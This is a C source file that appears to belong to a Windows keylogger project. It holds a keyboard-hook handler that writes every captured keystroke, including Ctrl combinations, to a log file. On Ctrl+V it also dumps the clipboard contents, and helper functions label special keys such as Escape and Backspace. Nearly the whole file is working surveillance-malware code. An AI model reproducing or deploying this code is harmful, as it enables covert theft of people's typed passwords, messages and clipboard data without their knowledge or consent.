#include "util/clipboard.h"
#include "util/file.h"
#include "util/keyboard.h"
#include "config.h"
#include "constants.h"
#include "keylogger.h"
#include <stdio.h>

DWORD log_kbd(const KBDLLHOOKSTRUCT *const kbd_hook) 
{
	if (is_ignored(kbd_hook->vkCode))
		return 1;

	static HANDLE out_file = NULL;

	DWORD rc = 0;

	if (!out_file) {
		rc = open_utf16_file(&out_file, OUT_FILE);

		if (rc)
			return rc;
	}

	LPCWSTR vk_val = get_virtual_key_value(kbd_hook->vkCode);

	if (vk_val != NULL) {
		rc = write_wstr(out_file, vk_val);
	} else if (is_key_down(VK_CONTROL)) {
		WCHAR ctrl[] = L"[CTRL + %c]";
		swprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl, 
			   (CHAR)kbd_hook->vkCode);
		rc = write_wstr(out_file, ctrl);

		if (!rc && kbd_hook->vkCode == VK_V)
			rc = write_clipboard_data(out_file);
	} else {
		WCHAR key_buff[KEY_BUFFER_SIZE];
		int count = kbd_to_unicode(kbd_hook, key_buff, KEY_BUFFER_SIZE);

		if (count > 0)
			rc = write_wstr(out_file, key_buff);
	}

	return rc;
}

BOOL is_ignored(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_LCONTROL:
	case VK_RCONTROL:
	case VK_CONTROL:
		return TRUE;
	default:
		return FALSE;
	}
}

LPCWSTR get_virtual_key_value(const DWORD vk_code)
{
	switch (vk_code) {
	case VK_RETURN:
		return L"\r\n";
	case VK_ESCAPE:
		return L"[ESC]";
	case VK_BACK:
		return L"[BACKSPACE]";
	default:
		return NULL;
	}
}
